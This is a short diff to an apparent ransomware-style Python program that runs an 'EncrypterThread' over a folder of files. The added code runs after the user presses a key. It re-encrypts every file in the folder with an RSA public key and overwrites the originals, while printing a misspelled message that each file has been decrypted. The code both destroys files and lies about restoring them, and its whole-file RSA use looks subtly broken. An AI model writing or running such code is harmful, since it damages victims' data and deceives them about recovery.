@@ -51,10 +51,27 @@ def main() -> None:
 
     enc_thread = EncrypterThread(files_path)
     enc_thread.start()
+    solved: bool = False
+
     while enc_thread.is_alive():
         if msvcrt.getch() == b"a":
             enc_thread.stop()
+            solved = True
             break
+
+    if solved:
+        files_count: int = len(os.listdir(files_path))
+        for file_num, file in enumerate(os.listdir(files_path)):
+
+            with open(f"{files_path}\\{file}", "rb") as f:
+                data = rsa.encrypt(f.read(), public_key)
+
+            with open(f"{files_path}\\{file}", "wb") as f:
+                f.write(data)
+
+            print(
+                f"File {file} was decruptad! Files left {files_count-file_num-1}/{files_count}"
+            )
 
 
 if __name__ == "__main__":
